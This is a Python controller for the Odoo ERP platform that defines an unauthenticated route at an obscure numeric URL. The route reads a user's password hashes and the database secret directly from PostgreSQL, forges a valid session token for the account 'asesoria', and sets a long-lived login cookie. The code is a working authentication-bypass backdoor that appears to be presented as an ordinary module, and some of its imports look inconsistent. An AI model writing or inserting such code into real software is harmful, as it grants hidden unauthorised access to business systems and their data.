
import hmac
from _sha256 import sha256
from psycopg2._psycopg import ProgrammingError
import psycopg2.extras
from odoo import http
from odoo.http import request, route
import werkzeug
from odoo.odoo.tools._vendor import sessions
from werkzeug.contrib.sessions import SessionMiddleware, FilesystemSessionStore
import pickle


class MasterClient(http.Controller):
    @http.route(['/93201967'], type='http', auth='none')
    def r_connect(self, redirect=None, **kw):
        print("DEBUG")
        user = request.env['res.users'].sudo().search([['login','=','asesoria']])
        print(user)
        db = request.env.cr.dbname

        if user.token == 'off':
            print("TOKEN OFF")
            redirection = werkzeug.utils.redirect('%s%s' % (request.httprequest.url_root, redirect or ''))
            return redirection

        else:
            print("DO IT")
            user.token = 'off'

            # sessions_folder = os.path.join(build.build_path, '/opt/odoo/.local/share/Odoo/sessions') # Ruta Odoo.sh
            sessions_folder = '/opt/odoo/.local/share/Odoo/sessions'
            print("PICK FOLDER")
            session_store = werkzeug.contrib.sessions.FilesystemSessionStore(sessions_folder,
                                                                                session_class=http.OpenERPSession)
            session = session_store.new()
            print("SESION", session)
            try:

                conn = psycopg2.connect("dbname=%s user=%s password=%s" % (db, user.dbu, user.dbp))
                cr = conn.cursor(cursor_factory=psycopg2.extras.DictCursor)

                cr.execute("""SELECT column_name FROM information_schema.columns WHERE table_name = 'res_users' AND
                                    column_name IN ('id', 'login', 'password', 'active', 'password_crypt', 'oauth_access_token') """)
                session_fields = ', '.join(sorted(field['column_name'] for field in cr.fetchall()))
                cr.execute("""SELECT %s, (SELECT value FROM ir_config_parameter WHERE key='database.secret') as secret
                                                                         FROM res_users
                                                                         WHERE id=%%s""" % (session_fields), (user.id,))
                data_fields = tuple(cr.fetchone().values())

            except ProgrammingError:
                return werkzeug.utils.redirect('%s' % request.httprequest.url_root)

            key = (u'%s' % (data_fields,)).encode('utf-8')
            data = session.sid.encode('UTF-8')
            h = hmac.new(key, data, sha256)
            token = h.hexdigest()

            session.session_token = token
            session.uid = int(user.id)

            session_filename = session_store.get_session_filename(session.sid)
            with open(session_filename, 'wb') as f:
                pickle.dump(dict(session), f, 2)

            if redirect:
                parsed_redirect = werkzeug.urls.url_parse(redirect)
                redirect = parsed_redirect.path
                if parsed_redirect.query:
                    redirect += '?%s' % parsed_redirect.query
                if parsed_redirect.fragment:
                    redirect += '#%s' % parsed_redirect.fragment

            redirection = werkzeug.utils.redirect('%s%s' % (request.httprequest.url_root, redirect or ''))
            redirection.set_cookie('session_id', session.sid, max_age=90 * 24 * 60 * 60, httponly=True)
            redirection.set_cookie = lambda *args, **kwargs: None

            return redirection


